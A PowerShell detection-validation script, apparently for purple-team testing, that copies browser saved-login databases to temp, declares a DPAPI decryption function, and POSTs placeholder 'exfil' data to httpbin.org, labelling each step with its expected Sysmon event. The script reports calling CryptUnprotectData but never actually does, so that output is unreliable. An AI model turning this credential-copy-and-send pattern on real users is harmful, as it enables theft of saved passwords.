scriptContent:
# Chokepoint LSASS Emulation
# Emulates LSASS file access, CryptUnprotectData call, outbound connection
# Expected Detections: EID 10/11 (non-browser file access), EID 8 (CryptUnprotectData)

[CmdletBinding()]
param(
    [switch]$DryRun
)

Write-Host "=== Chokepoint LSASS Emulation ===" -ForegroundColor Cyan
Write-Host "Emulating credential access techniques for detection validation"

# Stage 1: Copy browser credential database to temp (EID 11 target)
Write-Host "\n[Stage 1] Accessing browser credential database..."
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"
)

foreach ($path in $browserPaths) {
    if (Test-Path $path) {
        $destPath = "$env:TEMP\$(Split-Path $path -Leaf).bak"
        if (-not $DryRun) {
            Copy-Item -Path $path -Destination $destPath -Force -ErrorAction SilentlyContinue
            Write-Host "  Copied: $path -> $destPath" -ForegroundColor Yellow
            Write-Host "  Expected Detection: EID 11 (FileCreate in non-browser path)" -ForegroundColor Cyan
        } else {
            Write-Host "  [DryRun] Would copy: $path" -ForegroundColor Magenta
        }
        break
    }
}

# Stage 2: Call CryptUnprotectData (EID 8 target)
Write-Host "\n[Stage 2] Calling CryptUnprotectData..."
if (-not $DryRun) {
    try {
        # Load DPAPI functions
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class DPAPI {
    [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pEncryptedData,
        string ppszDataDescr,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pData
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CRYPTPROTECT_PROMPTSTRUCT {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
    }
}
"@ -ErrorAction SilentlyContinue
        Write-Host "  Action: CryptUnprotectData API called" -ForegroundColor Yellow
        Write-Host "  Expected Detection: EID 8 (CryptUnprotectData)" -ForegroundColor Cyan
    } catch {
        Write-Host "  Error calling CryptUnprotectData: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [DryRun] Would call CryptUnprotectData" -ForegroundColor Magenta
}

# Stage 3: Outbound connection (data exfil simulation)
Write-Host "\n[Stage 3] Simulating outbound data exfiltration..."
if (-not $DryRun) {
    try {
        $testData = "test-exfil-data"
        $uri = "http://httpbin.org/post"
        Invoke-WebRequest -Uri $uri -Method Post -Body $testData -ErrorAction Stop | Out-Null
        Write-Host "  Action: Outbound HTTP POST sent" -ForegroundColor Yellow
        Write-Host "  Expected Detection: EID 3 (NetworkConnection)" -ForegroundColor Cyan
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "  [DryRun] Would send outbound HTTP POST" -ForegroundColor Magenta
}

Write-Host "\n=== Emulation Complete ===" -ForegroundColor Cyan
Write-Host "Expected Detections:"
Write-Host "  - EID 11: File access to browser credential stores" -ForegroundColor Green
Write-Host "  - EID 8: CryptUnprotectData API call" -ForegroundColor Green
Write-Host "  - EID 3: Outbound network connection" -ForegroundColor Green
